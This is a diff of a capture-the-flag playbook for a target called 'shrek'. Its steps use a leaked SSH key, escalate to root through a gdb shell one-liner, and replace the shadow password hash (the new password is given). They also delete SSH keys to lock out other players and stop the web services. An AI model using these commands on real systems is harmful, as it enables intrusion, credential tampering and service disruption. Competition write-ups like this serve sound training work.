@@ -42,20 +42,26 @@ profit
 ## shrek:  
 navigate to <ip>/Cpxtpt2hWCee9VFa.txt  
 save the rsa key  
-chmod 600 <filename>  
-ssh -i <filename> shrek@<ip>  
+```	
+chmod 600 <filename>
+ssh -i <filename> shrek@<ip>
 gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit  
+```
 be root  
-copypaste these in place of shrek's account in /etc/shadow  
+copy/paste these in place of shrek's account in /etc/shadow  
+```
 shrek:$6$RwIzHJ10kWpv2ynr$92aiv.epBTHF53gJSCgywTU6wAqGjuc1LP7gHaRKdJiKTAuOSHHLYFfZnTVI65U0PucUV7Dq/ntD0Nhcf5.yX1:18333:0:99999:7:::  
+```
 you now have shrek:onionshavelayers  
-make shrek a sudoer  
+```make shrek a sudoer  
 sudo chmod 0000 /usr/bin/gdb  
 cd .ssh  
 rm *  
+```
 grab the flag if someone else hasn't already  
-sudo systemctl stop httpd  
+```sudo systemctl stop httpd  
 sudo systemctl stop tomcat  
+```
 afterwards stuff        
 
 
